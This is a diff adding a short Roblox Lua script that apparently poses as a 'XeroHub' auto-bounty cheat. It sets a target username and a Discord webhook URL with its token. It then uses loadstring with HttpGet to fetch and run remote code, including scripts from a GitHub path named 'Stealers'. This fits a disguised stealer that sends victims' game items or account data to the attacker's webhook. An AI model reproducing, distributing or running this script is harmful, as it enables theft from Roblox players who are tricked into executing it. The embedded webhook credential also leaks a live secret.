@@ -1,0 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/Stealers/roblox/Gui/XeroHubAutoBounty", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/Stealers/roblox/Gui/XeroHub/Marine", true))()
+
+Username = "kely5171"
+Webhook = "https://discord.com/api/webhooks/1288002984969506837/oEXtp0wFkmxSWHErGkoQKPPv4M96LEoQmgR2c50KfQyxgRFIp7hQcpi3U1ZK7qx7mkuF"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dosiobodydoedy/x/main/bf.lua", true))()
